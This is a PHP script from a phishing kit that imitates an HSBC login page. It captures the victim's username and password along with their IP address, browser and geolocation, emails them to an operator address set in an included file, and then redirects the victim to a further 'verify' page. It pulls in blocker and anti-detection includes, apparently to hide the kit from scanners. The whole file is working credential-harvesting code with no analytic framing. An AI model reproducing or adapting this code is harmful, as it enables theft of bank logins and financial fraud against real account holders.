<?php
	session_start();
    include './youremail.php';
	include './blocker.php';
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
				
				$_SESSION['PW'] = $_POST['PW'];


    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
	$cn= $_SESSION['UN'] ;
    $subject = "hsbc login $ip ";
    $message = '|============ HSbc Login ===========|'."\r\n";
	$message .= "|Username: ".$_SESSION['UN']."\n";
    $message .= "|Password: ".$_SESSION['PW']."\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";

    
	if (strlen($cn) <= 16 && $cn != "" ){
		
	mail($to, $subject, $message);
	}
	else{
	    echo "invalid input";
	}
    
    header("Location: verify.php");
 ?>